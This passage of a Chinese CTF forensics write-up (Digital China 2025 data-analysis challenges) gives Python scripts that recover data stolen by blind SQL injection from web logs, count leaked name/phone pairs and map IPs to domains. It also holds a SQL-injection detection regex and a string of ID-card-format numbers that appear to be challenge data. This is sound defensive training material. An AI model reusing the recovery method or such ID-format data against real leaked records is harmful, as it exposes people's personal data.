src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743429690846-ed99c4f6-bdff-4a2d-96e5-2f620634cda8.png" alt="img"></p><p>写脚本还原攻击者得到的信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则表达式定义（编译一次，避免重复编译）</span></span><br><span class="line">LOG_PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&#x27;(?P&lt;client_ip&gt;\d+\.\d+\.\d+\.\d+)\s-\s-\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;\[(?P&lt;timestamp&gt;.*?)\]\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;&quot;(?P&lt;method&gt;\w+)\s(?P&lt;path&gt;[^\s]+)\sHTTP/1.1&quot;\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;(?P&lt;status&gt;\d+)\s(?P&lt;size&gt;\d+)\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;&quot;(?P&lt;referrer&gt;.*?)&quot;\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;&quot;(?P&lt;user_agent&gt;.*?)&quot;&#x27;</span></span><br><span class="line">)</span><br><span class="line">SQL_INJ_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;substr\(\((.*?)\),(\d+),\d+\)\)=(\d+)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_logs</span>(<span class="params">file_path: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析日志文件并返回结构化数据&quot;&quot;&quot;</span></span><br><span class="line">    logs = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">match</span> = LOG_PATTERN.<span class="keyword">match</span>(line.strip())</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    log = <span class="keyword">match</span>.groupdict()</span><br><span class="line">                    log[<span class="string">&#x27;status&#x27;</span>] = <span class="built_in">int</span>(log[<span class="string">&#x27;status&#x27;</span>])</span><br><span class="line">                    log[<span class="string">&#x27;size&#x27;</span>] = <span class="built_in">int</span>(log[<span class="string">&#x27;size&#x27;</span>])</span><br><span class="line">                    log[<span class="string">&#x27;path&#x27;</span>] = unquote(log[<span class="string">&#x27;path&#x27;</span>])</span><br><span class="line">                    logs.append(log)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 文件 <span class="subst">&#123;file_path&#125;</span> 未找到&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 解析日志时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 共解析出 <span class="subst">&#123;<span class="built_in">len</span>(logs)&#125;</span> 条日志&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> logs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_injection_logs</span>(<span class="params">logs: <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]</span>) -&gt; <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;筛选可能包含 SQL 注入的日志&quot;&quot;&quot;</span></span><br><span class="line">    filtered = [</span><br><span class="line">        log <span class="keyword">for</span> log <span class="keyword">in</span> logs </span><br><span class="line">        <span class="keyword">if</span> log[<span class="string">&#x27;path&#x27;</span>].startswith(<span class="string">&#x27;/manager/user/?&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;--&#x27;</span> <span class="keyword">in</span> log[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 共筛选出 <span class="subst">&#123;<span class="built_in">len</span>(filtered)&#125;</span> 条注入相关日志&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filtered</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_blind_sql_data</span>(<span class="params">logs: <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;提取盲注数据并分组&quot;&quot;&quot;</span></span><br><span class="line">    grouped = defaultdict(<span class="keyword">lambda</span>: &#123;<span class="string">&#x27;sql&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;chars&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">        <span class="keyword">match</span> = SQL_INJ_PATTERN.search(log[<span class="string">&#x27;path&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            sql_expr, pos, ascii_val = <span class="keyword">match</span>.groups()</span><br><span class="line">            pos, ascii_val = <span class="built_in">int</span>(pos), <span class="built_in">int</span>(ascii_val)</span><br><span class="line">            key = sql_expr</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 只在第一次设置 SQL 表达式</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> grouped[key][<span class="string">&#x27;sql&#x27;</span>]:</span><br><span class="line">                grouped[key][<span class="string">&#x27;sql&#x27;</span>] = sql_expr</span><br><span class="line">            grouped[key][<span class="string">&#x27;chars&#x27;</span>][pos] = ascii_val</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 共分组 <span class="subst">&#123;<span class="built_in">len</span>(grouped)&#125;</span> 组盲注数据&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(grouped)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_data</span>(<span class="params">grouped: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;重建并输出盲注猜测结果&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> key, info <span class="keyword">in</span> grouped.items():</span><br><span class="line">        sql = info[<span class="string">&#x27;sql&#x27;</span>]</span><br><span class="line">        chars = info[<span class="string">&#x27;chars&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chars:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    SQL语句: <span class="subst">&#123;sql&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    猜测结果: 无数据&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        max_pos = <span class="built_in">max</span>(chars.keys())</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(chars.get(i, <span class="built_in">ord</span>(<span class="string">&#x27;?&#x27;</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_pos + <span class="number">1</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    SQL语句: <span class="subst">&#123;sql&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    猜测结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">file_path: <span class="built_in">str</span> = <span class="string">&#x27;4.txt&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 解析日志</span></span><br><span class="line">    logs = parse_logs(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> logs:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 筛选注入日志</span></span><br><span class="line">    injection_logs = filter_injection_logs(logs)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> injection_logs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到符合条件的注入日志&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取盲注数据</span></span><br><span class="line">    blind_sql_data = extract_blind_sql_data(injection_logs)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> blind_sql_data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未提取到盲注数据&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重建并输出结果</span></span><br><span class="line">    reconstruct_data(blind_sql_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743429894771-b7306d27-44b4-4109-9a09-dbb3f0f1d3a2.png" alt="img"></p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743429934948-78ddb1b2-ebc7-4b49-b74c-37133e82cf0f.png" alt="img"></p><p>按照要求将身份证号按姓名首字母升序排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">500101200012121234340104197612121234530102199810101234610112200109091234230107196504041234120105197411111234310115198502021234370202199404041234330106197708081234450305198303031234220203198808081234350203200202021234130104198707071234110101199001011234430104199707071234320508200005051234510104199311111234440305199503031234420103199912121234210202198609091234410105199206061234</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743430170087-467158d3-2663-4772-b8d8-f66acca2ca2c.png" alt="img"></p><h3 id="数据社工-1"><a href="#数据社工-1" class="headerlink" title="数据社工"></a>数据社工</h3><p>见writeup部分</p><h3 id="数据攻防-1"><a href="#数据攻防-1" class="headerlink" title="数据攻防"></a>数据攻防</h3><h4 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h4><p>过滤POST请求流量</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743420369281-36a4e744-0ba9-4f6f-96ac-f5c387733221.png" alt="img"></p><p>可有看到有一条流量是上传了.htaccess文件，调用了一个叫2.abc的文件</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743420505347-c889fe42-6d12-4531-8ec0-6fe4aae11cde.png" alt="img"></p><p>2.abc</p><h4 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h4><p>可惜了当时没先看这个，占分又多又跟前面没什么关系，关键还能ai一把梭。。。</p><p>写脚本计算即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计姓名和手机号的组合次数</span></span><br><span class="line">counts = defaultdict(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取日志内容并解析</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;http.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;&#123;&#x27;</span>) <span class="keyword">and</span> line.endswith(<span class="string">&#x27;&#125;&#x27;</span>):  <span class="comment"># 识别JSON行</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = json.loads(line)</span><br><span class="line">                name = data.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">                phone = data.get(<span class="string">&#x27;phone&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">and</span> phone:</span><br><span class="line">                    counts[(name, phone)] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按泄露次数排序，次数相同按姓名和手机号排序</span></span><br><span class="line">sorted_counts = <span class="built_in">sorted</span>(counts.items(), key=<span class="keyword">lambda</span> x: (-x[<span class="number">1</span>], x[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取TOP3并格式化输出</span></span><br><span class="line">top3 = sorted_counts[:<span class="number">3</span>]</span><br><span class="line">result = [<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>,<span class="subst">&#123;phone&#125;</span>,<span class="subst">&#123;count&#125;</span>&quot;</span> <span class="keyword">for</span> (name, phone), count <span class="keyword">in</span> top3]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;;&#x27;</span>.join(result))</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743421280663-ae5b29fa-d6c7-4c86-8e71-8457411dadd6.png" alt="img"></p><p>1ee668548a135dced8dadd510762525a</p><h3 id="数据跨境-1"><a href="#数据跨境-1" class="headerlink" title="数据跨境"></a>数据跨境</h3><h4 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h4><p>先导出所有的目标地址</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743422494721-4b98289c-3ec6-4183-958a-f38117c28998.png" alt="img"></p><p>写个脚本计算一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 list.json 文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;list.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 IP 到域名的映射字典</span></span><br><span class="line">ip_to_domain = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> category <span class="keyword">in</span> data[<span class="string">&#x27;categories&#x27;</span>].values():</span><br><span class="line">    <span class="keyword">for</span> domain, ip <span class="keyword">in</span> category[<span class="string">&#x27;domains&#x27;</span>].items():</span><br><span class="line">        ip_to_domain[ip] = domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 ip_dst.txt 文件并统计 IP 出现次数</span></span><br><span class="line">ip_counts = Counter()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_dst.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        ip = line.strip()</span><br><span class="line">        <span class="keyword">if</span> ip:  <span class="comment"># 确保不是空行</span></span><br><span class="line">            ip_counts[ip] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只保留在 list.json 中出现的 IP 的统计结果</span></span><br><span class="line">filtered_counts = &#123;ip: count <span class="keyword">for</span> ip, count <span class="keyword">in</span> ip_counts.items() <span class="keyword">if</span> ip <span class="keyword">in</span> ip_to_domain&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> filtered_counts:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;在 ip_dst.txt 中没有找到 list.json 中的任何 IP 地址&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 找到出现次数最多的 IP</span></span><br><span class="line">    most_common_ip, count = <span class="built_in">max</span>(filtered_counts.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    domain = ip_to_domain[most_common_ip]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;domain&#125;</span>:<span class="subst">&#123;most_common_ip&#125;</span>:<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743422468259-dde7dd31-c915-4b44-86a9-fa26d80dbb7f.png" alt="img"></p><h4 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h4><p>导出所有ftp传输的文件</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743423035285-5ab6f4b1-c953-46b4-8d77-7985f0b0ca59.png" alt="img"></p><p>文件中存在零宽字符隐写</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743423059306-794961e4-66fc-4a70-91e3-5f2fcc9bd72e.png" alt="img"></p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743423178380-c36fec98-5974-49d4-b8c6-1873d6ee5b3e.png" alt="img"></p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743423189634-9455a9a9-514a-4c7e-86df-afc56b261fc5.png" alt="img"></p><h4 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h4><p>看到一大堆的rtp流，是VoIP通话</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743424458208-3c73789f-c129-41c5-8cc2-a7a31030d46c.png" alt="img"></p><p>播放就可以听到两人机在那对话，其中有一条的对话中提到了答案</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-Writeup-%E5%A4%8D%E7%8E%B0/1743424647829-cf585ab5-44c7-4d9f-b89e-ded36b922f96.png" alt="img"></p><p>江苏工匠学院君立华域</p><p>jiangsugongjiangxueyuanjunlihuayu</p><blockquote><p>复现完感觉后悔死，为什么没有先看数据跨境，而先去看了数据攻防。。。</p><p>算了还是因为我太菜了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 数字中国 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2024 X1crypsc、谁动了我的MC？ Official Writeup</title>
      <link href="/posts/ff84a1f0/"/>
      <url>/posts/ff84a1f0/</url>
      
